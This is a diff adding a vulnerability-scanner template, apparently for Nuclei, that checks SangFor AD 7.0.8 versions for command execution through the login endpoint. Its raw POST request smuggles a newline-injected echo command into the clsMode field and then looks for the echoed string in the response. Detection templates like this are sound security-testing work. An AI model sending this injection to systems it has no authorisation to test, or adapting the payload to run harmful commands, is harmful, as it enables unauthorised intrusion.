@@ -1,0 +1,36 @@
+id: sangfor-ad-login-clsmode-command-execution
+info:
+  name: SangFor AD login clsMode Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SangFor AD version 7.0.8-7.0.8r5 contains a command execution vulnerability in the login interface. This allows attackers to execute arbitrary commands on the server through clsMode parameter manipulation.
+  tags: command-execution
+
+http:
+  - raw:
+      - |
+        POST /rep/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        clsMode=cls_mode_login%0Aecho {{randstr}}%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
+
+    extractors:
+      - type: regex
+        name: cluster_mode_check
+        part: body
+        internal: true
+        regex:
+          - "(cluster_mode_others.*)"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "cluster_mode_others"
+      - type: word
+        part: body
+        words:
+          - "{{randstr}}"
